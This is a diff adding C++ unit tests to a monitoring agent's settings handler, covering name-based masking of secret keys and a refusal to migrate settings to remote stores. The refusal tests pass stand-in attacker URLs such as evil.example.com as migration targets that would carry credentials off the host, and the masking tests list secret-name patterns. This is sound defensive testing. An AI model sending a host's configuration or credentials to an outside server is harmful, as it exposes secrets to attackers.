@@ -21,6 +21,7 @@
 #include <boost/asio/ip/host_name.hpp>
 #include <boost/filesystem.hpp>
 #include <fstream>
+#include <functional>
 #include <map>
 #include <memory>
 #include <settings/test_helpers.hpp>
@@ -662,14 +663,130 @@ TEST_F(SettingsHandlerTest, DefaultPasswordIsSensitiveWithoutAnyModule) {
 }
 
 TEST_F(SettingsHandlerTest, SeededSensitiveKeyDoesNotBleedToNeighbours) {
-  // Seeding is still an exact (path, key) entry - no name-based matching.
+  // A registered entry is still an exact (path, key) pair: it says nothing
+  // about the keys beside it.
   EXPECT_FALSE(impl_->is_sensitive_key("/settings/default", "allowed hosts"));
-  EXPECT_FALSE(impl_->is_sensitive_key("/settings/NRPE/server", "password"));
+}
+
+// ---------------------------------------------------------------------------
+// The name-based fallback.
+//
+// The registered set only ever holds what the modules currently *loaded*
+// declared, so a secret left in nsclient.ini for a module that is disabled or
+// not installed on this host - an NRPE client target password, a WEB password
+// with WEBServer off, an NRDP token - was returned in clear by
+// GET /api/v2/settings and by `nscp settings --list` without --load-all.
+// ---------------------------------------------------------------------------
+
+TEST_F(SettingsHandlerTest, AKeyThatReadsAsASecretIsMaskedWithoutItsModule) {
+  // No module has registered any of these in this fixture.
+  EXPECT_TRUE(impl_->is_sensitive_key("/settings/NRPE/server", "password"));
+  EXPECT_TRUE(impl_->is_sensitive_key("/settings/NRDP/client/targets/default", "token"));
+  EXPECT_TRUE(impl_->is_sensitive_key("/settings/WEB/server", "admin password"));
+  EXPECT_TRUE(impl_->is_sensitive_key("/settings/something", "API KEY")) << "matched case-insensitively";
+  EXPECT_TRUE(impl_->is_sensitive_key("/settings/something", "client secret"));
+  EXPECT_TRUE(impl_->is_sensitive_key("/settings/something", "passphrase"));
+}
+
+TEST_F(SettingsHandlerTest, ABareKeyIsOnlyASecretOnATarget) {
+  // `key` is the NRDP token's third spelling and appears on target objects;
+  // everywhere else it names a file, which is a path and not a secret.
+  EXPECT_TRUE(impl_->is_sensitive_key("/settings/NRDP/client/targets/default", "key"));
+  EXPECT_FALSE(impl_->is_sensitive_key("/settings/NRPE/server", "key"));
+  EXPECT_FALSE(impl_->is_sensitive_key("/settings/NRPE/server", "certificate key"));
+  EXPECT_FALSE(impl_->is_sensitive_key("/settings/NRPE/server", "dh key"));
+}
+
+TEST_F(SettingsHandlerTest, OrdinarySettingsAreNotMasked) {
+  for (const char *key : {"allowed hosts", "port", "timeout", "verify mode", "allow arguments", "certificate"}) {
+    EXPECT_FALSE(impl_->is_sensitive_key("/settings/NRPE/server", key)) << key;
+  }
+}
+
+// ---------------------------------------------------------------------------
+// Migration may read from a remote store but never write to one.
+//
+// The store factory honours every protocol it knows, http(s) included. Writing
+// there would send this host's configuration - the NRPE and NSCA keys, the WEB
+// password, every module's credentials - to whatever host the context named,
+// unredacted. Reading from one is the MSI's ImportConfig action and
+// `nscp settings --migrate-from <url>`, an operator importing a configuration,
+// and the transport for it is settled in settings_http (notice 280).
+// ---------------------------------------------------------------------------
+
+namespace {
+// The message is what is asserted, not merely that something threw:
+// create_instance() and a fetch can fail on their own, so a test demanding only
+// "some settings_exception" would pass with the rule removed - and, the other way
+// round, a remote *source* is expected to fail here (there is no server) without
+// that being a refusal.
+std::string thrown_message(const std::function<void()> &call) {
+  try {
+    call();
+  } catch (const settings::settings_exception &e) {
+    return std::string(e.what());
+  } catch (const std::exception &e) {
+    return std::string(e.what());
+  } catch (...) {
+    return std::string("(non-std exception)");
+  }
+  return std::string("(no exception)");
+}
+}  // namespace
+
+TEST_F(SettingsHandlerTest, MigratingToARemoteStoreIsRefused) {
+  for (const char *context : {"http://evil.example.com/nsclient.ini", "https://evil.example.com/nsclient.ini", "HTTPS://evil.example.com/x.ini"}) {
+    EXPECT_NE(thrown_message([&] { impl_->migrate_to("master", context); }).find("Refusing to migrate settings to a remote store"), std::string::npos)
+        << context;
+  }
+}
+
+TEST_F(SettingsHandlerTest, TheRefusalNamesTheContextAndWhyItIsRefused) {
+  const std::string what = thrown_message([&] { impl_->migrate_to("master", "https://evil.example.com/nsclient.ini"); });
+  EXPECT_NE(what.find("https://evil.example.com/nsclient.ini"), std::string::npos) << what;
+  EXPECT_NE(what.find("credentials"), std::string::npos) << what;
+  EXPECT_NE(what.find("boot.ini"), std::string::npos) << what;
+}
+
+// Importing from a remote store is a feature, not a hole: the MSI's
+// ImportConfig action and the --migrate-from CLI are the same operation, and
+// Control.LOAD is behind settings.put, which can already write [/modules] and
+// [/settings/external scripts] and reload. Whatever this fails with - there is
+// no server on the other end - it must not be the refusal.
+TEST_F(SettingsHandlerTest, MigratingFromARemoteStoreIsNotRefused) {
+  for (const char *context : {"http://config.example.com/nsclient.ini", "https://config.example.com/nsclient.ini"}) {
+    EXPECT_EQ(thrown_message([&] { impl_->migrate_from("master", context); }).find("Refusing"), std::string::npos)
+        << "a remote source must not be refused: " << context;
+  }
+}
+
+TEST_F(SettingsHandlerTest, TheCoresOwnCredentialManagerSwitchIsNotASecret) {
+  // `use credential manager` contains the "credential" needle and is a
+  // boolean. Masking it printed the switch as *** in a settings dump, and -
+  // before the two predicates were separated - the ini writer moved the flag
+  // itself into the Windows Credential Manager, leaving a $CRED$ marker in
+  // nsclient.ini for a value that was never a secret (and logging "only
+  // supported on windows" on every save elsewhere).
+  EXPECT_FALSE(impl_->is_sensitive_key("/settings", "use credential manager"));
+  EXPECT_FALSE(impl_->is_sensitive_key("/settings", "USE CREDENTIAL MANAGER")) << "the exception is case-insensitive like the needles";
+  EXPECT_FALSE(impl_->is_registered_sensitive_key("/settings", "use credential manager"));
+}
+
+// The masking question and the may-this-value-be-moved question are separate:
+// the first takes the name heuristic, the second only what a module declared.
+TEST_F(SettingsHandlerTest, OnlyRegisteredKeysCountAsRegisteredSensitive) {
+  EXPECT_TRUE(impl_->is_sensitive_key("/settings/NRPE/server", "password")) << "masked on its name";
+  EXPECT_FALSE(impl_->is_registered_sensitive_key("/settings/NRPE/server", "password")) << "no module declared it in this fixture";
+
+  impl_->add_sensitive_key(0xffff, "/settings/NRPE/server", "password");
+  EXPECT_TRUE(impl_->is_registered_sensitive_key("/settings/NRPE/server", "password"));
+  EXPECT_TRUE(impl_->is_sensitive_key("/settings/NRPE/server", "password"));
 }
 
 TEST_F(SettingsHandlerTest, SensitiveKeyIsExactPathPlusKey) {
   // The implementation combines path + "|||" + key, so a sensitive flag on
-  // "/a"."x" must NOT bleed into "/b"."x" or "/a"."y".
+  // "/a"."x" must NOT bleed into "/b"."x" or "/a"."y". (Names that read as a
+  // secret are matched separately; "x" and "y" do not.)
   impl_->add_sensitive_key(0xffff, "/a", "x");
   EXPECT_TRUE(impl_->is_sensitive_key("/a", "x"));
   EXPECT_FALSE(impl_->is_sensitive_key("/b", "x"));
